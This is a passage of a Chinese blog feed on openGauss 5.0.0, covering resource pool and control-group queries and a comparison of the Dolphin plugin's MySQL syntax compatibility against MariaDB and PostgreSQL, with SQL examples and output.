                      referrerpolicy="no-referrer"
                >
<h2 id="查看当前集群中所有的资源池信息">查看当前集群中所有的资源池信息</h2>
<p>以上所有资源配置完成后，通过系统表 <code>PG_RESOURCE_POOL</code> 查看当前集群所有资源池信息。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> PG_RESOURCE_POOL;</span><br></pre></td></tr></table></figure></div>
<img  alt="og07.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230712-4fe2a81f-8f4d-4e3f-87f1-ed220247201d.png"
                      referrerpolicy="no-referrer"
                >
<p>对于表 <code>PG_RESOURCE_POOL</code> 字段的含义，可以参考下面这个栗子：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(shawnyan<span class="variable">@192</span>) [dolphindb] <span class="number">17</span>:<span class="number">45</span>:<span class="number">44</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> PG_RESOURCE_POOL;</span><br><span class="line"><span class="operator">+</span><span class="operator">-</span>[ RECORD <span class="number">1</span> ]<span class="comment">------+---------------------+</span></span><br><span class="line"><span class="operator">|</span> respool_name      <span class="operator">|</span> default_pool        <span class="operator">|</span>资源池名称。</span><br><span class="line"><span class="operator">|</span> mem_percent       <span class="operator">|</span> <span class="number">100</span>                 <span class="operator">|</span>最大占用内存百分比。</span><br><span class="line"><span class="operator">|</span> cpu_affinity      <span class="operator">|</span> <span class="number">-1</span>                  <span class="operator">|</span>CPU亲和性，保留参数。</span><br><span class="line"><span class="operator">|</span> control_group     <span class="operator">|</span> DefaultClass:Medium <span class="operator">|</span>资源池关联的控制组。</span><br><span class="line"><span class="operator">|</span> active_statements <span class="operator">|</span> <span class="number">-1</span>                  <span class="operator">|</span>资源池允许的最大并发数。<span class="number">-1</span>为不限制并发数量，最大值不超过INT_MAX。</span><br><span class="line"><span class="operator">|</span> max_dop           <span class="operator">|</span> <span class="number">1</span>                   <span class="operator">|</span>开启SMP后，算子执行的并发度，保留参数。</span><br><span class="line"><span class="operator">|</span> memory_limit      <span class="operator">|</span> <span class="number">8</span>GB                 <span class="operator">|</span>内存使用上限，保留参数。</span><br><span class="line"><span class="operator">|</span> parentid          <span class="operator">|</span> <span class="number">0</span>                   <span class="operator">|</span>父资源池OID。</span><br><span class="line"><span class="operator">|</span> io_limits         <span class="operator">|</span> <span class="number">0</span>                   <span class="operator">|</span>每秒触发IO的次数上限。行存单位是万次<span class="operator">/</span>s，列存是次<span class="operator">/</span>s。<span class="number">0</span>表示不控制，最大值不超过INT_MAX。</span><br><span class="line"><span class="operator">|</span> io_priority       <span class="operator">|</span> <span class="keyword">None</span>                <span class="operator">|</span>IO利用率高达<span class="number">90</span><span class="operator">%</span>时，重消耗IO作业进行IO资源管控时关联的优先级等级。<span class="keyword">None</span>表示不控制。</span><br><span class="line"><span class="operator">|</span> nodegroup         <span class="operator">|</span> installation        <span class="operator">|</span>资源池所在的逻辑集群的名称(单机下不生效)。</span><br><span class="line"><span class="operator">|</span> is_foreign        <span class="operator">|</span> f                   <span class="operator">|</span>资源池不用于逻辑集群之外的用户(单机下不生效)。</span><br><span class="line"><span class="operator">|</span> max_worker        <span class="operator">|</span> [<span class="keyword">null</span>]              <span class="operator">|</span>只用于扩容的接口，表示扩容数据重分布时，表内插入并发度。</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------+---------------------+</span></span><br></pre></td></tr></table></figure></div>
<h2 id="查看某个资源池关联的控制组信息">查看某个资源池关联的控制组信息</h2>
<p>可以通过方法 <code>gs_control_group_info</code> 来查看某个资源池关联的控制组信息。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> gs_control_group_info(<span class="string">&#x27;res_pool_a1&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> gs_control_group_info(<span class="string">&#x27;res_pool_b2&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
<img  alt="og08.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230712-ef29d417-bfd7-4f7f-934a-3f36ffb43692.png"
                      referrerpolicy="no-referrer"
                >
<p>需要区分的是， <code>shares</code> 表示占父节点CPU资源的百分比； <code>limits</code> 表示占父节点CPU核数的百分比。</p>
<h2 id="Not-The-End">Not The End.</h2>
<p>能够顺利安装 openGauss 5.0.0 企业版，并成功开启资源控制特性，完成创建控制组、资源池，这只是开始。<br>
还有更多相关课题有待研究，比如：</p>
<ul>
<li>如何加强用户级别的资源控制能力，按用户、角色分配不同的资源，并且控制相关权限，以提升系统的安全性，避免权限过大或出现“提权”情况导致的资源浪费。</li>
<li>如何控制内存、IO、带宽，使得管理员可以对资源进行更加灵活和精细的控制。</li>
<li>建设资源管控相关的监控能力，完善可视化监控的能力，及处理相关告警和自动化维护的能力。</li>
<li>openGauss 5.0.0 的资源负载控制能力在面对大规模、高负载的业务场景下，如何保证系统的高性能和稳定性。</li>
</ul>
<p>对于 openGauss 的更多探索，还将继续。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/658163" >https://www.modb.pro/db/658163 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://mp.weixin.qq.com/s?__biz=MzIyMDE3ODk1Nw==&amp;mid=2247511266&amp;idx=1&amp;sn=a86c4bc257c5df272b5efd4d49f35f7c" >2023-08-28, 【好文推荐】openGauss 5.0.0 资源管控功能介绍 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://mp.weixin.qq.com/s?__biz=MzIyMDE3ODk1Nw==&amp;mid=2247510060&amp;idx=4&amp;sn=8a073e1eaa3e8f0c28754937b3928b6e" >2023-07-17, 【我和openGauss的故事】openGauss 5.0.0 资源管控功能介绍 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a class="link"   href="https://docs.opengauss.org/zh/docs/5.0.0/docs/PerformanceTuningGuide/%E8%B5%84%E6%BA%90%E8%B4%9F%E8%BD%BD%E7%AE%A1%E7%90%86%E6%A6%82%E8%BF%B0.html" >https://docs.opengauss.org/zh/docs/5.0.0/docs/PerformanceTuningGuide/资源负载管理概述.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>openGauss</category>
        <category>og v5</category>
      </categories>
      <tags>
        <tag>opengauss</tag>
        <tag>og v5</tag>
        <tag>cgroups</tag>
        <tag>资源负载</tag>
        <tag>资源池</tag>
      </tags>
  </entry>
  <entry>
    <title>openGauss 5.0.0 分区表增强</title>
    <url>/2023/opengauss/opengauss-v5-partition-table/</url>
    <content><![CDATA[<hr>
<p><a class="link"   href="https://www.modb.pro/db/658001" >https://www.modb.pro/db/658001 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://opengauss.org/zh/blogs/qiu0924/2023-07-16-openGauss-5-partition-table.html" >https://opengauss.org/zh/blogs/qiu0924/2023-07-16-openGauss-5-partition-table.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://mp.weixin.qq.com/s?__biz=MzIyMDE3ODk1Nw==&amp;mid=2247510030&amp;idx=8&amp;sn=415518156a4229a4ec0566d161d0fa59" >【我和openGauss的故事】 openGauss 5.0.0 分区表增强 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>openGauss</category>
        <category>og v5</category>
      </categories>
      <tags>
        <tag>opengauss</tag>
        <tag>og v5</tag>
        <tag>partition</tag>
      </tags>
  </entry>
  <entry>
    <title>openGauss 5.0.0 事务相关语法</title>
    <url>/2023/opengauss/opengauss-v5-transaction-grammar/</url>
    <content><![CDATA[<hr>
<p><a class="link"   href="https://www.modb.pro/db/658001" >https://www.modb.pro/db/658001 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://mp.weixin.qq.com/s?__biz=MzIyMDE3ODk1Nw==&amp;mid=2247510760&amp;idx=2&amp;sn=200bad7738043ac6a9b8603bee56fa09" >【我和openGauss的故事】 openGauss 5.0.0 事务相关语法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>openGauss</category>
        <category>og v5</category>
      </categories>
      <tags>
        <tag>opengauss</tag>
        <tag>og v5</tag>
        <tag>transaction</tag>
      </tags>
  </entry>
  <entry>
    <title>浅尝 openGauss v5.0.0 的 MySQL 语法兼容性</title>
    <url>/2023/opengauss/opengauss-v5-mysql-grammar/</url>
    <content><![CDATA[<img  alt="ogbanner.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230707-3141c49c-5099-49bb-bc9b-057487be5c8d.png"
                      referrerpolicy="no-referrer"
                >
<p>在 openGauss 中，以下简称 og5 ，提供了一个名为 Dolphin 的插件，并以此来提供 MySQL 的兼容性。</p>
<p>本文将以 openGauss v5.0.0 版本为基础，对照 PostgreSQL v15.2 和 MariaDB 10.7.3 来演示 Dolphin 插件的基础功能。</p>
<blockquote>
<p>openGauss提供dolphin Extension（版本为dolphin-1.0.0）。dolphin Extension是openGauss的MySQL兼容性数据库（dbcompatibility=‘B’）扩展，从关键字、数据类型、常量与宏、函数和操作符、表达式、类型转换、DDL/DML/DCL语法、存储过程/自定义函数、系统视图等方面兼容MySQL数据库。</p>
</blockquote>
<h2 id="环境准备">环境准备</h2>
<p>为验证本文中所使用的 SQL 语句，特意准备了一套实验环境，并为了做对照实验，还准备了 PostgreSQL 和 MariaDB 。<br>
分别连接到 DB 后，屏幕信息展示如下。</p>
<img  alt="og1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230707-ab53ec93-2a0f-41e4-94ea-3d75b395002b.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="启用-Dolphin-插件">启用 Dolphin 插件</h2>
<p>在 og5 中，新创建一个数据库，安装 Dophin 插件，并将参数开关打开：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 新建数据库 dophindb</span></span><br><span class="line"><span class="keyword">CREATE</span> DATBASE dolphindb DBCOMPATIBILITY <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 安装 Dophin 插件</span></span><br><span class="line"><span class="keyword">CREATE</span> EXTENSION dolphin;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 打开 dolphin.b_compatibility_mode 开关</span></span><br><span class="line"><span class="keyword">SET</span> dolphin.b_compatibility_mode <span class="operator">=</span> <span class="keyword">on</span>;</span><br></pre></td></tr></table></figure></div>
<p>校验以下，可以看到插件已经安装，兼容模式已经开启：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(shawnyan<span class="variable">@192</span>) [dolphindb] <span class="number">14</span>:<span class="number">24</span>:<span class="number">43</span><span class="operator">&gt;</span> \dx</span><br><span class="line">                                List <span class="keyword">of</span> installed extensions</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+---------+------------+--------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>      Name       <span class="operator">|</span> Version <span class="operator">|</span>   Schema   <span class="operator">|</span>                   Description                    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+---------+------------+--------------------------------------------------+</span></span><br><span class="line">...</span><br><span class="line"><span class="operator">|</span> dolphin         <span class="operator">|</span> <span class="number">1.0</span>     <span class="operator">|</span> public     <span class="operator">|</span> <span class="keyword">sql</span> engine                                       <span class="operator">|</span></span><br><span class="line">...</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+---------+------------+--------------------------------------------------+</span></span><br><span class="line">(<span class="number">8</span> <span class="keyword">rows</span>)</span><br><span class="line"></span><br><span class="line">(shawnyan<span class="variable">@192</span>) [dolphindb] <span class="number">14</span>:<span class="number">30</span>:<span class="number">23</span><span class="operator">&gt;</span> <span class="keyword">show</span> dolphin.b_compatibility_mode;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------+</span></span><br><span class="line"><span class="operator">|</span> dolphin.b_compatibility_mode <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">on</span>                           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------+</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<p>这里也出现了第一个兼容说明，可以像在mysql中查看插件一样，在og中使用 show plugins 语法</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(shawnyan<span class="variable">@192</span>) [dolphindb] <span class="number">15</span>:<span class="number">24</span>:<span class="number">07</span><span class="operator">&gt;</span> <span class="keyword">show</span> plugins;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+----------+------+---------+---------+--------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>      Name       <span class="operator">|</span>  Status  <span class="operator">|</span> Type <span class="operator">|</span> Library <span class="operator">|</span> License <span class="operator">|</span>                           Comment                            <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+----------+------+---------+---------+--------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> dblink          <span class="operator">|</span> DISABLED <span class="operator">|</span>      <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>         <span class="operator">|</span> <span class="keyword">connect</span> <span class="keyword">to</span> other PostgreSQL databases <span class="keyword">from</span> <span class="keyword">within</span> a database <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> dist_fdw        <span class="operator">|</span> ACTIVE   <span class="operator">|</span>      <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>         <span class="operator">|</span> <span class="keyword">foreign</span><span class="operator">-</span>data wrapper <span class="keyword">for</span> distfs access                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> dolphin         <span class="operator">|</span> ACTIVE   <span class="operator">|</span>      <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>         <span class="operator">|</span> <span class="keyword">sql</span> engine                                                   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> file_fdw        <span class="operator">|</span> ACTIVE   <span class="operator">|</span>      <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>         <span class="operator">|</span> <span class="keyword">foreign</span><span class="operator">-</span>data wrapper <span class="keyword">for</span> flat file access                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> hstore          <span class="operator">|</span> ACTIVE   <span class="operator">|</span>      <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>         <span class="operator">|</span> data type <span class="keyword">for</span> storing sets <span class="keyword">of</span> (key, <span class="keyword">value</span>) pairs             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> log_fdw         <span class="operator">|</span> ACTIVE   <span class="operator">|</span>      <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>         <span class="operator">|</span> <span class="keyword">Foreign</span> Data Wrapper <span class="keyword">for</span> accessing logging data              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mot_fdw         <span class="operator">|</span> ACTIVE   <span class="operator">|</span>      <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>         <span class="operator">|</span> <span class="keyword">foreign</span><span class="operator">-</span>data wrapper <span class="keyword">for</span> MOT access                          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> plpgsql         <span class="operator">|</span> ACTIVE   <span class="operator">|</span>      <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>         <span class="operator">|</span> PL<span class="operator">/</span>pgSQL procedural <span class="keyword">language</span>                                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> postgres_fdw    <span class="operator">|</span> DISABLED <span class="operator">|</span>      <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>         <span class="operator">|</span> <span class="keyword">foreign</span><span class="operator">-</span>data wrapper <span class="keyword">for</span> remote PostgreSQL servers           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> security_plugin <span class="operator">|</span> ACTIVE   <span class="operator">|</span>      <span class="operator">|</span> <span class="keyword">NULL</span>    <span class="operator">|</span>         <span class="operator">|</span> provides security functionality                              <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+----------+------+---------+---------+--------------------------------------------------------------+</span></span><br><span class="line">(<span class="number">10</span> <span class="keyword">rows</span>)</span><br></pre></td></tr></table></figure></div>
<h2 id="兼容性测试">兼容性测试</h2>
<p>启用兼容模式后，意味着兼容 MySQL 语法，但并不代表完全兼容，可能是完全兼容、部分兼容，或者不兼容。<br>
下面具体举例来看。</p>
<h3 id="DDL">DDL</h3>
<p>在 mysql 中，创建 schema 之后，可以使用 use 切换，而在 pg 中需要 set search_path.<br>
在 og 中，同样可以使用 use，并且功能同 search_path 切换。</p>
<ul>
<li>mariadb</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> use sbtest;</span><br><span class="line">Reading <span class="keyword">table</span> information <span class="keyword">for</span> completion <span class="keyword">of</span> <span class="keyword">table</span> <span class="keyword">and</span> <span class="keyword">column</span> names</span><br><span class="line">You can turn off this feature <span class="keyword">to</span> <span class="keyword">get</span> a quicker startup <span class="keyword">with</span> <span class="operator">-</span>A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [sbtest]<span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> Tables_in_sbtest <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> t1               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<ul>
<li>pg</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">dophindb<span class="operator">=</span># <span class="keyword">create</span> <span class="keyword">table</span> sbtest.t1(id <span class="type">int</span>);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span></span><br><span class="line">dophindb<span class="operator">=</span># <span class="keyword">set</span> search_path<span class="operator">=</span>sbtest;</span><br><span class="line"><span class="keyword">SET</span></span><br><span class="line">dophindb<span class="operator">=</span># \d</span><br><span class="line">        List <span class="keyword">of</span> relations</span><br><span class="line">Schema <span class="operator">|</span> Name <span class="operator">|</span> Type  <span class="operator">|</span>  Owner</span><br><span class="line"><span class="comment">--------+------+-------+----------</span></span><br><span class="line">sbtest <span class="operator">|</span> t1   <span class="operator">|</span> <span class="keyword">table</span> <span class="operator">|</span> postgres</span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<ul>
<li>og</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(shawnyan<span class="variable">@192</span>) [dolphindb] <span class="number">14</span>:<span class="number">51</span>:<span class="number">57</span><span class="operator">&gt;</span> use sbtest</span><br><span class="line">dolphindb<span class="operator">-</span><span class="operator">&gt;</span> ;</span><br><span class="line"><span class="keyword">SET</span></span><br><span class="line"><span class="type">Time</span>: <span class="number">0.655</span> ms</span><br><span class="line">(shawnyan<span class="variable">@192</span>) [dolphindb] <span class="number">14</span>:<span class="number">52</span>:<span class="number">00</span><span class="operator">&gt;</span> \d</span><br><span class="line">                           List <span class="keyword">of</span> relations</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------+-------+----------+----------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Schema <span class="operator">|</span> Name <span class="operator">|</span> Type  <span class="operator">|</span>  Owner   <span class="operator">|</span>             Storage              <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------+-------+----------+----------------------------------+</span></span><br><span class="line"><span class="operator">|</span> sbtest <span class="operator">|</span> t1   <span class="operator">|</span> <span class="keyword">table</span> <span class="operator">|</span> shawnyan <span class="operator">|</span> &#123;orientation<span class="operator">=</span><span class="type">row</span>,compression<span class="operator">=</span><span class="keyword">no</span>&#125; <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------+-------+----------+----------------------------------+</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br><span class="line"></span><br><span class="line">(shawnyan<span class="variable">@192</span>) [dolphindb] <span class="number">14</span>:<span class="number">52</span>:<span class="number">02</span><span class="operator">&gt;</span> <span class="keyword">show</span> search_path;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> search_path <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> sbtest      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br><span class="line"></span><br><span class="line">(shawnyan<span class="variable">@192</span>) [dolphindb] <span class="number">15</span>:<span class="number">18</span>:<span class="number">34</span><span class="operator">&gt;</span> <span class="keyword">show</span> <span class="built_in">current_schema</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="built_in">current_schema</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line"><span class="operator">|</span> sbtest         <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------------+</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<p>再看下创建表：</p>
<p>og/pg 不支持 create or replcace,</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [sbtest]<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">table</span> t1 (id <span class="type">int</span>, c1 bit, c2 <span class="type">boolean</span>);</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.005</span> sec)</span><br><span class="line"></span><br><span class="line">(shawnyan<span class="variable">@192</span>) [dolphindb] <span class="number">15</span>:<span class="number">18</span>:<span class="number">54</span><span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">table</span> t1 (id <span class="type">int</span>, c1 bit, c2 <span class="type">boolean</span>);</span><br><span class="line">ERROR:  syntax error <span class="keyword">at</span> <span class="keyword">or</span> near &quot;table&quot;</span><br><span class="line">LINE <span class="number">1</span>: <span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">table</span> t1 (id <span class="type">int</span>, c1 bit, c2 <span class="type">boolean</span>);</span><br><span class="line">                          <span class="operator">^</span></span><br></pre></td></tr></table></figure></div>
<p>但是都支持 create table if not exists，</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [sbtest]<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">table</span> if <span class="keyword">not</span> <span class="keyword">exists</span> t2 (id <span class="type">int</span>, c1 bit, c2 <span class="type">boolean</span>);</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.008</span> sec)</span><br><span class="line"></span><br><span class="line">dophindb<span class="operator">=</span># <span class="keyword">create</span> <span class="keyword">table</span> if <span class="keyword">not</span> <span class="keyword">exists</span> t2 (id <span class="type">int</span>, c1 bit, c2 <span class="type">boolean</span>);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span></span><br><span class="line"></span><br><span class="line">(shawnyan<span class="variable">@192</span>) [dolphindb] <span class="number">15</span>:<span class="number">18</span>:<span class="number">55</span><span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">table</span> if <span class="keyword">not</span> <span class="keyword">exists</span> t2 (id <span class="type">int</span>, c1 bit, c2 <span class="type">boolean</span>);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span></span><br></pre></td></tr></table></figure></div>
<p>在 pg 中查询建表语句不是很方便，只能自己写方法或者借助第三方工具，在 MariaDB 中只需 show create table 即可，<br>
来看下 og 的表现：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(shawnyan<span class="variable">@192</span>) [dolphindb] <span class="number">15</span>:<span class="number">26</span>:<span class="number">04</span><span class="operator">&gt;</span> <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> t2;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-----------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Table</span> <span class="operator">|</span>              <span class="keyword">Create</span> <span class="keyword">Table</span>               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-----------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> t2    <span class="operator">|</span> <span class="keyword">SET</span> search_path <span class="operator">=</span> sbtest;              <span class="operator">+</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t2 (                      <span class="operator">+</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>       <span class="operator">|</span>     id <span class="type">integer</span>,                        <span class="operator">+</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>       <span class="operator">|</span>     c1 bit(<span class="number">1</span>),                         <span class="operator">+</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>       <span class="operator">|</span>     c2 <span class="type">boolean</span>                         <span class="operator">+</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>       <span class="operator">|</span> )                                      <span class="operator">+</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>       <span class="operator">|</span> <span class="keyword">WITH</span> (orientation<span class="operator">=</span><span class="type">row</span>, compression<span class="operator">=</span><span class="keyword">no</span>); <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-----------------------------------------+</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<p>更多 DDL 语法可参考文档：<a class="link"   href="https://docs.opengauss.org/zh/docs/5.0.0/docs/ExtensionReference/dolphin-DDL%E8%AF%AD%E6%B3%95%E4%B8%80%E8%A7%88%E8%A1%A8.html" >DDL语法一览表 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="进程信息">进程信息</h3>
<p>在 pg 中，可以通过系统表 pg_stat_activity 查看活跃的进程信息，效果如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">dophindb<span class="operator">=</span># <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> pg_stat_activity;</span><br><span class="line">datid <span class="operator">|</span> datname  <span class="operator">|</span> pid <span class="operator">|</span> leader_pid <span class="operator">|</span> usesysid <span class="operator">|</span> usename  <span class="operator">|</span> application_name <span class="operator">|</span> client_addr <span class="operator">|</span> client_hostname <span class="operator">|</span> client_port <span class="operator">|</span></span><br><span class="line">    backend_start         <span class="operator">|</span>          xact_start           <span class="operator">|</span>          query_start          <span class="operator">|</span>         state_change          <span class="operator">|</span> wait_e</span><br><span class="line">vent_type <span class="operator">|</span>     wait_event      <span class="operator">|</span> state  <span class="operator">|</span> backend_xid <span class="operator">|</span> backend_xmin <span class="operator">|</span> query_id <span class="operator">|</span>              query              <span class="operator">|</span>         backe</span><br><span class="line">nd_type</span><br><span class="line"><span class="comment">-------+----------+-----+------------+----------+----------+------------------+-------------+-----------------+-------------+-----</span></span><br><span class="line"><span class="comment">--------------------------+-------------------------------+-------------------------------+-------------------------------+-------</span></span><br><span class="line"><span class="comment">----------+---------------------+--------+-------------+--------------+----------+---------------------------------+--------------</span></span><br><span class="line"><span class="comment">----------------</span></span><br><span class="line">       <span class="operator">|</span>          <span class="operator">|</span>  <span class="number">11</span> <span class="operator">|</span>            <span class="operator">|</span>          <span class="operator">|</span>          <span class="operator">|</span>                  <span class="operator">|</span>             <span class="operator">|</span>                 <span class="operator">|</span>             <span class="operator">|</span> <span class="number">2023</span></span><br><span class="line"><span class="number">-07</span><span class="number">-07</span> <span class="number">04</span>:<span class="number">50</span>:<span class="number">01.059294</span><span class="operator">+</span><span class="number">00</span> <span class="operator">|</span>                               <span class="operator">|</span>                               <span class="operator">|</span>                               <span 